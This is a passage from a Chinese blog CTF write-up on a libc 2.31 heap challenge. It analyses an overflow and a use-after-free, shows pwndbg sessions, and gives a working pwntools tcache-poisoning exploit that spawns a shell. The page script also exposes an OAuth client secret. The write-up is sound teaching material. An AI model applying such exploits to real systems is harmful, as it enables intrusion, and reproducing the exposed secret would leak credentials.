<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">write_node</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIndex: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= <span class="number">9</span> &amp;&amp; nodes[index].used )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nSize: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nContent: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nodes[index].content_ptr, size);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index illegal!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="del-node- 函数分析"><a href="#del-node- 函数分析" class="headerlink" title="del_node 函数分析"></a>del_node 函数分析 </h4><p> 最后再来看 <code>del_node</code> 函数，首先检查的 index 范围还是一个越界，然后释放掉了 <code>content_ptr</code> 指针所指向的堆块，并且将 <code>size</code> 和 <code>used</code> 成员变量都置 0 ，但是 <code>content_ptr</code> 指针并没有置 0 ，那么它还是指向已经被释放掉的 content 堆块的，此处存在 UAF(Use After Free) 利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">del_node</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIndex: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= <span class="number">9</span> &amp;&amp; nodes[index].used )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(nodes[index].content_ptr);</span><br><span class="line">    nodes[index].size = <span class="number">0</span>;</span><br><span class="line">    nodes[index].used = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index illegal!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调试和利用漏洞获取 -shell"><a href="# 调试和利用漏洞获取 -shell" class="headerlink" title="调试和利用漏洞获取 shell"></a>调试和利用漏洞获取 shell</h3><p>先来总结一下通过上面分析得到的所有条件：</p>
<ol>
<li>程序主动泄露了 <code>buffer</code> 的地址</li>
<li><code>write_node</code> 函数存在堆溢出漏洞，可以溢出任意大小</li>
<li><code>del_node</code> 函数在释放 node 时没有将 <code>content_ptr</code> 置 NULL ，可以实现 Use After Free</li>
<li><code>write_node</code> 和 <code>del_node</code> 函数都存在下标越界问题，但可能较难利用，因为还存在对 <code>used</code> 成员变量的检查</li>
<li>当 <code>buffer</code> 的第 16 个字节不为 0 值时，可以获得 shell</li>
<li>程序使用的 libc 版本为 2.31，加入了 tcache 机制，释放的堆块会进入 tcachebin 而不是 fastbin</li>
</ol>
<p>通过这些条件，大致可以产生这样一个利用思路：创建 3 个 node ，即申请 3 个堆块（称为 0、1、2 号块），依次释放掉 1 号堆块和 2 号堆块，利用 0 号块的溢出将已经被释放掉的 1 号块的 fd 指针由原先的 2 号堆块地址修改为 <code>buffer + 16</code> 的地址，然后依次再申请两个堆块，这样第一次申请到的是先前释放掉的 2 号堆块，第二次申请到的则是 <code>buffer + 16</code> 处的缓冲区。利用 <code>write_node</code> 函数向缓冲区开头写入任意内容，在下次 while 循环时，<code>if (*(_QWORD *)(buff + 16) )</code> 判断通过，程序直接执行 <code>system(&quot;/bin/sh&quot;);</code> 返回 shell。</p>
<p>先创建 3 个大小为 16 的堆块试一下，可以看到，从 Top Chunk 分割出来了 3 个小堆块，size 显示为 21（64 位系统中能够划分的最小 chunk 大小为 0x20 字节，其中 chunk size 的最低三位由低到高存储的依次是 PREV_INUSE、IS_MMAPPED 和 NON_MAIN_ARENA 信息，这里它们的值分别是 1、0、0 ，所以 size 的最低位是 1 ，并不是说这块 chunk 的大小是 0x21 字节）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/nuke/work/ctf/nese/monthly_7/pwn1/heap </span><br><span class="line">hint: 0x555555558040</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit</span><br><span class="line">=&gt; 1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">16</span><br><span class="line">node index: 0</span><br><span class="line">...</span><br><span class="line">=&gt; 1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">16</span><br><span class="line">node index: 1</span><br><span class="line">...</span><br><span class="line">=&gt; 1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">16</span><br><span class="line">node index: 2</span><br><span class="line">...</span><br><span class="line">=&gt; ^C</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596e0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559700</span><br><span class="line">Size: 0x20901</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x5555555596a0</span><br><span class="line">0x5555555596a0:	0x0000000000000000	0x0000000000000021  &lt;--- | prev_size |    size    |</span><br><span class="line">0x5555555596b0:	0x0000000000000000	0x0000000000000000  &lt;--- |      user data         |</span><br><span class="line">0x5555555596c0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5555555596d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555555596e0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5555555596f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555559700:	0x0000000000000000	0x0000000000020901</span><br><span class="line">0x555555559710:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555559720:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555559730:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>接着，释放掉后两个堆块，再次查看堆的情况。可以看到，释放的堆块并没有像在 libc 2.23 中一样回收到了 fastbin，而是放进了 tcachebin 中，但其仍然是由 fd 指针链接到一起的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">Index: </span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">=&gt; 4</span><br><span class="line"></span><br><span class="line">Index: </span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">=&gt; ^C</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">...</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596e0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5555555596d0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [2]: 0x5555555596f0 —▸ 0x5555555596d0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/12gx 0x5555555596a0</span><br><span class="line">0x5555555596a0:	0x0000000000000000	0x0000000000000021 &lt;--- | prev_size |    size    |</span><br><span class="line">0x5555555596b0:	0x0000000000000000	0x0000000000000000 &lt;--- |      user data         |</span><br><span class="line">0x5555555596c0:	0x0000000000000000	0x0000000000000021 &lt;--- | prev_size |    size    |</span><br><span class="line">0x5555555596d0:	0x0000000000000000	0x0000555555559010 &lt;--- |     fd    |     bk     |</span><br><span class="line">0x5555555596e0:	0x0000000000000000	0x0000000000000021 &lt;--- | prev_size |    size    |</span><br><span class="line">0x5555555596f0:	0x00005555555596d0	0x0000555555559010 &lt;--- |     fd    |     bk     |</span><br></pre></td></tr></table></figure>

<p>接着再创建与刚删掉的堆块大小一样的两个堆块，可以看到，刚刚的两个堆块又回来了。（拿来吧你）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">16</span><br><span class="line">node index: 1</span><br><span class="line">...</span><br><span class="line">=&gt; 1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">16</span><br><span class="line">node index: 2</span><br><span class="line">...</span><br><span class="line">=&gt; ^C</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/gx (void *)&amp;nodes+16</span><br><span class="line">0x5555555580b0 &lt;nodes+16&gt;:	0x00005555555596f0</span><br><span class="line">pwndbg&gt; x/gx (void *)&amp;nodes+16*2</span><br><span class="line">0x5555555580c0 &lt;nodes+32&gt;:	0x00005555555596d0</span><br></pre></td></tr></table></figure>

<p>现在可以编写利用脚本进行利用了，还需要注意的是，我们要修改的是 2 号堆块的 fd 指针，溢出时还会覆盖 1 号堆块的全部内容还有 2 号堆块自身的 size 字段，需要进行填充。利用脚本如下，可以在 while 循环里的 fwrite 函数处下中断，这样每次执行完一个操作后都会停下来，便于观察。</p>
<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NeSE 丙组月赛 2021 年 7 月</span></span><br><span class="line"><span class="comment"># 题目：heap</span></span><br><span class="line"><span class="comment"># 作者：ChinaNuke</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_create</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;=&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: \n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_write</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;=&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: \n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: \n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: \n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_del</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;=&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: \n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;xxx.xxx.xxx.xxx&#x27;</span>, xxxxx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Receive the leaked buffer address</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;hint: 0x&#x27;</span>)</span><br><span class="line">buff_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;buff_addr: <span class="subst">&#123;buff_addr:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd_create(<span class="number">0x10</span>)</span><br><span class="line">cmd_create(<span class="number">0x10</span>)</span><br><span class="line">cmd_create(<span class="number">0x10</span>)</span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># Breakpoint on fwrite() function call</span></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b *$rebase(0x16a5)&#x27;)</span></span><br><span class="line">cmd_write(<span class="number">0</span>, <span class="number">80</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span> + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span> + p64(<span class="number">0x21</span>) + p64(buff_addr+<span class="number">16</span>))</span><br><span class="line">cmd_create(<span class="number">0x10</span>)</span><br><span class="line">cmd_create(<span class="number">0x10</span>)</span><br><span class="line">cmd_write(<span class="number">2</span>, <span class="number">8</span>, <span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到，在写入 payload 造成溢出之后，重新申请堆块之前，tcachebin 中的第二个元素被替换成了 buffer + 16 的地址，这时我们再连续申请两个堆块，那么拿到的后一个堆块就是以 buffer + 16 为地址的堆块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [2]: 0x555fe286a2f0 —▸ 0x555fe1c91050 (buffer+16) ◂— 0x0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [1]: 0x555fe1c91050 (buffer+16) ◂— 0x0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/gx (void *)&amp;nodes+16*2</span><br><span class="line">0x555fe1c910c0 &lt;nodes+32&gt;:  0x0000555fe1c91050</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>Write-up | NeSE 丙组 7 月月赛</p><p><a href="https://www.nuke666.cn/2021/08/Write-up-for-NeSE-monthly-contest-in-July/">https://www.nuke666.cn/2021/08/Write-up-for-NeSE-monthly-contest-in-July/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>ChinaNuke</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-08-11</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/11/Some-useful-cheat-sheets/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">一些有用的 Cheat Sheets</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/08/Specify-switch-statement-in-IDA-Pro/"><span class="level-item">在 IDA Pro 中恢复 switch 语句</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.7.2/gitalk.css"><script src="https://cdnjs.loli.net/ajax/libs/gitalk/1.7.2/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "c36502ebbe58ee074625f9f79503a7d7",
            repo: "chinanuke.github.io",
            owner: "ChinaNuke",
            clientID: "3f7fe9cdb9780bcf2eb8",
            clientSecret: "fa11d11f3291e3e92da34995cef1cea1eca4f60e",
            admin: ["ChinaNuke"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            proxy: "https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token",
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen is-3-fullhd  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.jpg" alt="ChinaNuke"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">ChinaNuke</p><p class="is-size-6 is-block">一个入门小 pwn 手</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中科院信息工程研究所</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/chinanuke" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/chinanuke"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="Mailto:chinanuke@nuke666.cn"><i class="far fa-envelope"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#题目考点"><span class="level-left"><span class="level-item">1</span><span class="level-item">题目考点</span></span></a></li><li><a class="level is-mobile" href="#解题思路"><span class="level-left"><span class="level-item">2</span><span class="level-item">解题思路 </span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#程序静态分析"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">程序静态分析 </span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#init- 函数分析"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">init 函数分析 </span></span></a></li><li><a class="level is-mobile" href="#create-node- 函数分析和结构体识别"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">create_node 函数分析和结构体识别 </span></span></a></li><li><a class="level is-mobile" href="#write-node- 函数分析"><span class="level-left"><span class="level-item">2.1.3</span><span class="level-item">write_node 函数分析 </span></span></a></li><li><a class="level is-mobile" href="#del-node- 函数分析"><span class="level-left"><span class="level-item">2.1.4</span><span class="level-item">del_node 函数分析 </span></span></a></li></ul></li><li><a class="level is-mobile" href="#调试和利用漏洞获取 -shell"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">调试和利用漏洞获取 shell</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">友情链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://huuhghhgyg.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Huuhghhgyg</span></span><span class="level-right"><span class="level-item tag">huuhghhgyg.github.io</span></span></a></li><li><a class="level is-mobile" href="http://www.f0und.icu/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">F0und</span></span><span class="level-right"><span class="level-item tag">www.f0und.icu</span></span></a></li><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Linux/"><span class="level-start"><span class="level-item">Linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BD%91%E7%AB%99/"><span class="level-start"><span class="level-item">网站</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-12T10:14:41.000Z">2022-02-12</time></p><p class="title"><a href="/2022/02/Write-up-for-NeSE-202202/">Write-up | NeSE 丙组 202202</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-06T03:45:12.000Z">2022-02-06</time></p><p class="title"><a href="/2022/02/Install-arch-linux/">Arch Linux 安装步骤记录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-26T07:03:36.000Z">2021-11-26</time></p><p class="title"><a href="/2021/11/Some-useful-cheat-sheets/">一些有用的 Cheat Sheets</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-11T06:16:58.000Z">2021-08-11</time></p><p class="title"><a href="/2021/08/Write-up-for-NeSE-monthly-contest-in-July/">Write-up | NeSE 丙组 7 月月赛</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-06T12:19:05.000Z">2021-08-06</time></p><p class="title"><a href="/2021/08/Specify-switch-statement-in-IDA-Pro/">在 IDA Pro 中恢复 switch 语句</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Git/"><span class="tag">Git</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Markdown/"><span class="tag">Markdown</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"><span class="tag">使用技巧</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"><span class="tag">网络设置</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">ChinaNuke的博客</a><p class="is-size-7"><span>&copy; 2022 ChinaNuke</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ChinaNuke/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><a href="http://beian.miit.gov.cn/" target="_blank" style="color:inherit">京ICP备2021027097号</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="托管于 GitHub Pages" href="https://github.com/ChinaNuke/ChinaNuke.github.io"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: false,
                    fold: ''
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶部" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>